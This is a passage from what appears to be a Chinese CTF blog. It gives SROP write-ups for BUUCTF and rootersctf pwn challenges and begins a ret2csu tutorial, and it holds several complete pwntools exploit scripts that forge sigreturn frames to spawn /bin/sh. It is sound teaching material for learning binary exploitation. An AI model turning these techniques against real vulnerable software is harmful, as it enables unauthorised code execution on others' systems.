<p>最后的难点就是我们的system call chains的构建，<strong>由于我们肯定是用一次sigreturn然后控制参数去调用read（因为我们要把参数写入指定的地址），但是由于我们没办法直接系统调用 sigreturn，需要间接的用read函数来控制RAX在系统调用才行，并且还需要一次sigreturn去控制参数调用execve</strong>。</p>
<p>这里也是用了一个非常巧妙的手法，由于要控制RAX为15，这就意味着我们只能输入15个字节的内容，可是我们还需要去构造signal frame，因此我们分两次完成，第一次输入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame)</span><br></pre></td></tr></table></figure>

<p>这个start可以让我们再输入一次，而此时把frame给构建到栈里面，这八个a则是负责去占一个位置（如下图）</p>
<p><img src="/../img/2706180-20220220190323742-16754978.png"></p>
<p>第二次输入，这样syscall就到了原本八个a占的位置，而七个b则是为了凑齐十五个字节（如下图）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220220190329950-517103708.png"></p>
<p>按照这两次payload就可以实现sigreturn调用了。</p>
<p>然后就没什么了，最后要注意一下，第二次执行sigreturn的第一个payload顺便把参数给发送过去，然后用我们在系统调用read的那个rsi配合偏移来获取&#x2F;bin&#x2F;sh的地址即可。</p>
<p>最后的exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28000)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x4000BE</span></span><br><span class="line">start_addr=<span class="number">0x4000B0</span></span><br><span class="line">payload=p64(start_addr)*<span class="number">3</span></span><br><span class="line"><span class="comment">#第一个start去让第一次正常运行的ret返回到start</span></span><br><span class="line"><span class="comment">#第二个start让\xB3输入进来，此时去改变了栈顶的start，此时它跳过了xor rax,rax，并</span></span><br><span class="line"><span class="comment">#且它的下面还有一个start</span></span><br><span class="line"><span class="comment">#最下面的start是让我们可以再输入frame，一直控制程序执行流</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">&#x27;\xB3&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x2000</span><span class="comment">#减去0x2000，把payload写到该地址</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0x400</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">frame.rsp=target_addr</span><br><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr+<span class="number">0x110</span> <span class="comment">#此时加上0x110才是/bin/sh的地址</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUCTF-ciscn-2019-es-7"><a href="#BUUCTF-ciscn-2019-es-7" class="headerlink" title="BUUCTF_ciscn_2019_es_7"></a>BUUCTF_ciscn_2019_es_7</h2><p>这里我以BUUCTF上的ciscn_2019_es_7来演示一下（这道题我最开始是用ret2csu做出来的，那个WP放到了ret2csu的那篇博客上，这篇博客写一下SROP这个方法）</p>
<p>其实SROP的思路很简单，并且pwntools中也提供了Sigreturn Frame类来简化我们代码的编写。</p>
<p><img src="/../img/2706180-20220220190338842-381275045.png"></p>
<p>这道题在主函数里只有两个系统调用，不过发现这个write系统调用时有漏洞的，它可以打印0x30个数据，可是可以看出来buf距离栈底仅仅只有0x10字节</p>
<p><img src="/../img/2706180-20220220190344777-904593431.png"></p>
<p>这就意味着write是可以去泄露栈中数据的，因此我们就可以配合系统调用read来把&#x2F;bin&#x2F;sh写入栈里面，同时里面偏移加上泄露的栈地址，我们就可以计算出&#x2F;bin&#x2F;sh的地址。（这个&#x2F;bin&#x2F;sh偏移的计算在ret2csu中已经提过了，这里就不在赘述）</p>
<p>然后我们还发现了系统调用sigreturn</p>
<p><img src="/../img/2706180-20220220190351016-2105082674.png"></p>
<p>这就意味着我们可以去实现SROP了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28000)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">csu_gadget1=<span class="number">0x40059A</span></span><br><span class="line">modify_rax=<span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2=<span class="number">0x400580</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span></span><br><span class="line">bss_addr=<span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">read_syscall=<span class="number">0x4004ED</span></span><br><span class="line">mov_rax_15=<span class="number">0x4004DA</span></span><br><span class="line">kong=<span class="number">0x600e50</span></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(read_syscall)<span class="comment">#这次发送的目的就是获取/bin/sh的地址</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>)<span class="comment">#限制一下条件，确保接收的是我们要泄露的地址</span></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">bin_sh_addr=leak_addr-<span class="number">280</span><span class="comment">#这个偏移在ret2csu中计算出来了，这里不再重复提了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">frame=SigreturnFrame()<span class="comment">#接下来开始设置参数</span></span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=bin_sh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(mov_rax_15)+p64(syscall_addr)+<span class="built_in">str</span>(frame)</span><br><span class="line"><span class="comment">#这次payload的目的是把/bin/sh存到栈里，并且伪造一个Signal Frame</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="BUUCTF-ciscn-2019-s-3"><a href="#BUUCTF-ciscn-2019-s-3" class="headerlink" title="BUUCTF_ciscn_2019_s_3"></a>BUUCTF_ciscn_2019_s_3</h2><p><img src="/../img/2706180-20220222104440708-175917302.png"></p>
<p><img src="/../img/2706180-20220222104446654-1916710342.png"></p>
<p>这已经很明显了，要用SROP。</p>
<p>先去把栈地址泄露一下。</p>
<p>第一次随便输入（不过最后要在返回地址上写一个vul的首地址，重新进行read）</p>
<p>第一次走vul就是为了write泄露地址</p>
<p><img src="/../img/2706180-20220222104450476-1019432047.png"></p>
<p>我们要泄露距离栈顶第三个的内容，因为它指向了栈地址</p>
<p><img src="/../img/2706180-20220222104454166-166128671.png"></p>
<p>然后发现这个地址是在32字节处被接收的</p>
<p>经过观察read函数，发现我们payload从0x7fffffffdf70开始存储，看一下泄露的栈地址距离这个df70的偏移</p>
<p><img src="/../img/2706180-20220222104457644-721340483.png"></p>
<p>偏移拿到，然后就直接构造srop的那个payload即可，我们要保证&#x2F;bin&#x2F;sh在df70这个地址，然后经过调试发现这里是要填充16个字节才能到返回地址的，因此我就填了两个&#x2F;bin&#x2F;sh\x00，第二次填充别的也行，反正要凑齐十六个字节</p>
<p>Exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26430)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *&#x27;+&#x27;0x400517&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">vul_addr=<span class="number">0x4004ED</span></span><br><span class="line">kong=<span class="number">0x600e50</span></span><br><span class="line">modify_rax=<span class="number">0x4004DA</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x400517</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x118</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">frame.rsp=kong</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(modify_rax)+p64(syscall_ret_addr)+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这道题其实收获最大的并不是这个正确的exp</p>
<p>而是下面这个错误的exp(这个exp脚本直接运行的话，是拿不到shell的，但是如果用gdb附加进程调试的话，是可以拿到shell的，因此这个exp是非常奇怪的，但它确实是错的，只不过因为巧合在调试的情况下，是正确的)</p>
<p>可以发现这个exp发送了三次payload</p>
<p>第三次和第二次payload就是在布置准备执行srop的条件</p>
<p>当时用gdb调试走到最后发现就可以获取shell</p>
<p>但是如果直接运行这个脚本就不能获取shell</p>
<p>卡了很久很久，最后请教了roderick师傅，最后豁然开朗，解释如下。</p>
<p><strong>在挂gdb的时候 第二次的read还没有执行，但是内核缓冲区的数据已经拷贝到了用户数据 意思就是说 我的第二次payload和第三次的payload现在都存到了缓冲区里面 gdb调试到了第二个read，直接就把两次的payload 都给读进去了（我又看了下调试发现却是是这样） 然后这两次的内容在一次里面修改了栈空间恰好就是对的了 但是我程序运行的时候，还是发了三次的payload</strong></p>
<hr>
<p> <strong>简单来说就是就是其实我现在用gdb看的是一种假象，gdb现在调试让我看到的 是一次性发送了两个payload的情况，但事实上我程序本身运行的时候 并不是我现在gdb看到的情况</strong>** </p>
<p> <font color=red><strong>以后这里就要注意了，如果是多个read的情况，使用gdb调试的时候要注意，避免一次read给读进去两次payload。</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26430)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *&#x27;+&#x27;0x400517&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pid&#x27;</span>+<span class="built_in">str</span>(proc.pidof(p)))</span><br><span class="line">vul_addr=<span class="number">0x4004ED</span></span><br><span class="line">modify_rax=<span class="number">0x4004DA</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x400517</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x118</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(vul_addr)+p64(modify_rax)+p64(syscall_ret_addr)<span class="comment">#核心问题是在这里，此时的return直接返回到了modify_rax这个地址，没有到vul_addr这个地址，因此程序其实并没有执行第三次的输入。</span></span><br><span class="line">p.send(payload)</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">payload=<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a>rootersctf_2019_srop</h2><p><img src="/../img/image-20221007110823863.png" alt="image-20221007110823863"></p>
<p>发现这里就一个输入和输出的系统调用，发现无论如何也无法泄露栈地址，因此&#x2F;bin&#x2F;sh直接写入栈里的话我们是不知道地址的。所以采用srop伪造两次上下文，第一次系统调用read将&#x2F;bin&#x2F;sh以及第二次伪造的上下文都写入data段(data段地址是固定不变的)，然后迁移到data段，进行第二次srop。</p>
<p>这道题控制第一次rip的gadget为syscall;leave;ret,而leave和ret指令相当于mov rbp,rsp;pop rbp;pop  rip，调试一下就发现我们控制rsp没用，要去控制rbp，在执行leave;ret的时候又将rbp给了rsp，因此第一次布置的寄存器的值中只需控制rbp即可。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29672</span>)</span><br><span class="line">syscall_addr=<span class="number">0x0000000000401033</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401032</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0x402000</span></span><br><span class="line">frame.rdx=<span class="number">0x1000</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">frame.rbp=<span class="number">0x402000</span>-<span class="number">8</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax)+p64(<span class="number">15</span>)+<span class="built_in">str</span>(frame)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=<span class="number">0x402108</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">payload=p64(pop_rax)+p64(<span class="number">15</span>)+<span class="built_in">str</span>(frame)+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007110808668.png" alt="image-20221007110808668"></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>SROP</tag>
      </tags>
  </entry>
  <entry>
    <title>关于ret2csu的学习总结</title>
    <url>/posts/4202235.html</url>
    <content><![CDATA[<h2 id="什么是ret2csu？"><a href="#什么是ret2csu？" class="headerlink" title="什么是ret2csu？"></a>什么是ret2csu？</h2><p>这个其实就是在程序中一般都会有一段万能的控制参数的gadgets，里面可以控制rbx,rbp,r12,r13,r14,r15以及rdx,rsi,edi的值，并且还可以call我们指定的地址。然后劫持程序执行流的时候，劫持到这个__libc_csu_init函数去执行（这个函数是用来初始化libc的，因此只要是动态链接的程序就都会有这个函数（至少我还没有遇见过特殊情况）），<strong>从而达到控制参数的目的</strong>。</p>
<span id="more"></span>

<h2 id="下面是-libc-csu-init的汇编代码。"><a href="#下面是-libc-csu-init的汇编代码。" class="headerlink" title="下面是__libc_csu_init的汇编代码。"></a>下面是__libc_csu_init的汇编代码。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:0000000000400540                 public __libc_csu_init</span><br><span class="line">.text:0000000000400540 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:0000000000400540 ; __unwind &#123;</span><br><span class="line">.text:0000000000400540                 push    r15</span><br><span class="line">.text:0000000000400542                 push    r14</span><br><span class="line">.text:0000000000400544                 mov     r15d, edi</span><br><span class="line">.text:0000000000400547                 push    r13</span><br><span class="line">.text:0000000000400549                 push    r12</span><br><span class="line">.text:000000000040054B                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400552                 push    rbp</span><br><span class="line">.text:0000000000400553                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:000000000040055A                 push    rbx</span><br><span class="line">.text:000000000040055B                 mov     r14, rsi</span><br><span class="line">.text:000000000040055E                 mov     r13, rdx</span><br><span class="line">.text:0000000000400561                 sub     rbp, r12</span><br><span class="line">.text:0000000000400564                 sub     rsp, 8</span><br><span class="line">.text:0000000000400568                 sar     rbp, 3</span><br><span class="line">.text:000000000040056C                 call    _init_proc</span><br><span class="line">.text:0000000000400571                 test    rbp, rbp</span><br><span class="line">.text:0000000000400574                 jz      short loc_400596</span><br><span class="line">.text:0000000000400576                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400578                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400580</span><br><span class="line">.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400580                 mov     rdx, r13</span><br><span class="line">.text:0000000000400583                 mov     rsi, r14</span><br><span class="line">.text:0000000000400586                 mov     edi, r15d</span><br><span class="line">.text:0000000000400589                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040058D                 add     rbx, 1</span><br><span class="line">.text:0000000000400591                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594                 jnz     short loc_400580</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596 loc_400596:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400596                 add     rsp, 8</span><br><span class="line">.text:000000000040059A                 pop     rbx</span><br><span class="line">.text:000000000040059B                 pop     rbp</span><br><span class="line">.text:000000000040059C                 pop     r12</span><br><span class="line">.text:000000000040059E                 pop     r13</span><br><span class="line">.text:00000000004005A0                 pop     r14</span><br><span class="line">.text:00000000004005A2                 pop     r15</span><br><span class="line">.text:00000000004005A4                 retn</span><br><span class="line">.text:00000000004005A4 ; &#125; // starts at 400540</span><br><span class="line">.text:00000000004005A4 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
<h2 id="如何利用csu这部分代码？"><a href="#如何利用csu这部分代码？" class="headerlink" title="如何利用csu这部分代码？"></a>如何利用csu这部分代码？</h2><p><img src="/../img/2706180-20220218171725002-1163274691.png"></p>
<p>我们利用的其实就是这两部分的代码，我们给这两段起个名字，上面的部分叫gadget2，下面的部分叫gadget1（因为我们先执行下面的部分，因此就叫下面的gadget1吧）</p>
<p>假设我们现在通过溢出，已经可以控制程序的执行流了，我们此时就把返回地址填写成gadget1的地址0x40059A（因为我们并不需要add rsp,8这个指令，因此直接从0x40059A开始即可）</p>
<p>现在就会把栈中的前6个数据分别弹给rbx,rbp,r12,r13,r14,r15这六个寄存器。</p>
<p>我们通常会把rbx的值设置成0，而rbp设置成1.这样的目的是在执行call    qword ptr [r12+rbx*8]这个指令的时候，我们仅仅把r12的值给设置成指向我们想call地址的地址即可，从而不用管rbx。</p>
<p>又因为这三个指令add     rbx,；cmp     rbx, rbp；jnz     short loc_400580，jnz是不相等时跳转，我们通常并不想跳转到0x400580这个地方，因为此刻执行这三个指令的时候，我们就是从0x400580这个地址过来的。因此rbx加一之后，我们要让它和rbp相等，因此rbp就要提前被设置成1.</p>
<p>然后r12要存放的就是指向（我们要跳转到那个地址）的地址。这里有个很重要的小技巧，如果你不想使用这个call，或者说你想call一个函数，但是你拿不到它的got地址，因此没法使用这个call，那就去call一个空函数（_term_proc函数）（并且要注意的是，r12的地址填写的并不是_term_proc的地址，而是指向这个函数的地址）。</p>
<p>然后r13,r14,r15这三个值分别对应了rdx,rsi,edi。这里要注意的是，r15最后传给的是edi,最后rdi的高四字节都是00，而低四字节才是r15里的内容。（也就是说如果想用ret2csu去把rdi里存放成一个地址是不可行的）</p>
<p>接着到了gadget1的结尾ret这里，然后我们紧接着写入gadget2的地址0x400580。<br><img src="/../img/2706180-20220218171748437-1273885946.png"></p>
<p>此时开始执行这部分代码，这没什么好说的了，就是把r13,r14,r15的值放入rdx,rsi,edi三个寄存器里面。</p>
<p>然后由于我们前面的rbx是0，加一之后等于了rbp，因此jnz不跳转。那就继续向下执行，如果我们上面call了一个空函数的话，那我们就利用下面的ret。由于继续向下执行，因此又来到了gadget1这里。</p>
<p><img src="/../img/2706180-20220218171758126-1557535385.png"></p>
<p>如果不需要再一次控制参数的话，那我们此时把栈中的数据填充56（7*8你懂得）个垃圾数据即可。</p>
<p>如果我们还需要继续控制参数的话，那就此时不填充垃圾数据，继续去控制参数，总之不管干啥呢，这里都要凑齐56字节的数据，以便我们执行最后的ret，最后ret去执行我们想要执行的函数即可。</p>
<h3 id="错位获取pop-rsi-pop-rdi"><a href="#错位获取pop-rsi-pop-rdi" class="headerlink" title="错位获取pop rsi;pop rdi"></a>错位获取pop rsi;pop rdi</h3><p>如果只是要单纯控制pop rsi和pop rdi寄存器的话，可以不用ret2csu，直接搜的。因为pop r14和pop r15（这两个gadget存在于__libc_csu_init)对应的机器码分别为</p>
<p><img src="/../img/2706180-20220416083231234-1556484483.png"></p>
<p>（汇编如何看对应的机器码，我在shellcode那一篇博客中已经讲过了）可以发现pop rsi和pop rdi分别存在于pop r14和pop r15的机器码中，因此我们可以利用错位来得到他们。用Ropgadget直接搜pop rsi或是搜它的机器码5e，就会出来错位得到的地址。(方法如下)不过没有办法通过错位来得到pop rdx。</p>
<p><img src="/../img/2706180-20220416083243224-1368780037.png"></p>
<h2 id="ret2csu相关题目"><a href="#ret2csu相关题目" class="headerlink" title="ret2csu相关题目"></a>ret2csu相关题目</h2><p>下面是我做过三道关于ret2csu的题目，附上WP</p>
<h3 id="VNCTF2022公开赛clear-got"><a href="#VNCTF2022公开赛clear-got" class="headerlink" title="VNCTF2022公开赛clear_got"></a>VNCTF2022公开赛clear_got</h3><p>做这道题，必须先掌握下面这三个点。</p>
<p>1、首先是call指令后面的这个地址（如果是函数名就不说了），就比如现在ret2csu中，准备执行这个</p>
<p><img src="/../img/2706180-20220218171949096-1693789079.png"></p>
<p>我们让rbx为0，此时call r12，那怎么才能call成功呢，原本看到师傅们说是要装got地址，后来发现装一个地址（这个地址是被另一个地址所指向的），然后把r12填写成另一个地址，也可以call成功，再回想一下为什么要装got地址，而不是plt地址，原因也是出现在了got地址仅仅会跳转一次，也就是说填一个got地址，也是会从这个地址去跳到got地址所指向的地址（也就是真实地址（因为延迟绑定的原因，如果不清楚的话，这里请自行百度一下延迟绑定机制）），因此结论就出来了，要想去call去跳转到一个地址A，那就必须用一个指向地址A的地址B放到call后面。</p>
<p>2、如果我们仅仅是想利用ret2csu去控制参数，而并不想去用call执行，或者说是你想用call执行跳转，但是你找不到去指向你想跳转的那个地址，因此我们用最后的ret跳转（你想跳转到哪里，就填哪的地址即可）。那怎么把call的那一步忽略呢？我们可以call一个空函数（不需要参数，执行之后也不会对程序本身造成任何影响的函数），这个函数就是_term_proc（注意，这里call的是指向_term_proc的地址，而非term_proc的地址</p>
<p><img src="/../img/2706180-20220218171956921-899601017.png"></p>
<p>3、怎么去修改rax的值？</p>
<p>这里提到了一种很巧妙的方法。我们先来看一下read函数和write函数的返回值。</p>
<p><img src="/../img/2706180-20220218172005653-329466746.png"></p>
<p>图片出自(25条消息) read的返回值卖保险的码农的博客-CSDN博客read函数返回值</p>
<p>read和write函数 - 故事， - 博客园 (cnblogs.com)</p>
<p>我们可以看出来read函数和write函数最后的返回值都是实际读到和写入的字节数（如果执行成功的话），而返回值最后就会放到rax里面。也就是说可以利用read和write去控制我们想要的rax。（为啥要控制rax？淦，你只要知道这个控制rax的方法就行了，需要的时候就能用到，就比如这道题）</p>
<p>掌握上述三点之后，就可以来做题了。</p>
<p><img src="/../img/2706180-20220218172017865-1429417700.png"></p>
<p><img src="/../img/2706180-20220218172033310-262577355.png"></p>
<p>发现主函数很简单，buf也是存在溢出，意味着我们可以控制返回地址。</p>
<p><img src="/../img/2706180-20220218172041135-1398354103.png"></p>
<p>没有发现后门函数和参数，但是发现有两个系统调用，这里很可疑，留意一下。</p>
<p>这道题的困难点其实在这里<br><img src="/../img/2706180-20220218172048110-1930281658.png"></p>
<p>Memset清空了0x601008往下面的0x38个字节的内容，我们看一下0x601008是什么<br><img src="/../img/2706180-20220218172054303-1345094970.png"></p>
<p>发现居然是got表，got表被清空了意味着什么，1、我们之前已经完成延迟绑定的函数的真实地址已经不在got表了。2、最开始（执行延迟绑定之前）got表原本跳往extern的地址，变成了0。</p>
<p>也就是说执行了这个memset之后，我们在got表中的所有函数都没法再被使用了。</p>
<p>但是我们能用的有什么？只剩下了系统调用，可是想用系统调用执行execve(‘&#x2F;bin&#x2F;sh’,0,0)，我们需要做到三件事，第一是控制rax，第二是控制rdi,rsi,rdx这三个寄存器，第三是将&#x2F;bin&#x2F;sh写入到bss段。</p>
<p>控制rax？，有没有想到最开始提到的那个方法，利用read或者write去修改rax。由于我们还要写入&#x2F;bin&#x2F;sh，因此我们这里采用系统调用read，可是read的系统调用号是0，而程序中出现的两个系统调用没有read，怎么办？其实不用管的，因为main函数的返回值是0，在main函数的ret之前，就把rax的值给设成0了，因此我们溢出之后，始终rax都是0（在执行系统调用之前）。</p>
<p>既然现在可以系统调用read，那只需要控制参数，将&#x2F;bin&#x2F;sh写入bss段即可，怎么控制参数？用Ropgadget搜索之后发现，没有能控制rsi和rdx的寄存器，因此只能采用ret2csu的方法。</p>
<p>最后有两点要注意</p>
<p>第一，  我们系统调用了一次输入，在这次输入里，必须填充到59个字节</p>
<p>第二，  由于第一次输入最多只能输入0x100个字节，因此我们是没法随心所欲构造gadgets的，要考虑长度限制，因为光垃圾数据都填充了0x68个字节。因此需要考虑两点，第一点，我们两次系统调用（第一次调用read第二次调用system），第二次如果再用ret去返回到系统调用，字节是超了的，因此我们第一次ret进行一下系统调用，然后再ret2csu，这一次在call的时候就要想办法去系统调用，可是我们在这个程序里是找不到指向这个地址的地址。</p>
<p><img src="/../img/2706180-20220218172110241-1964520348.png"></p>
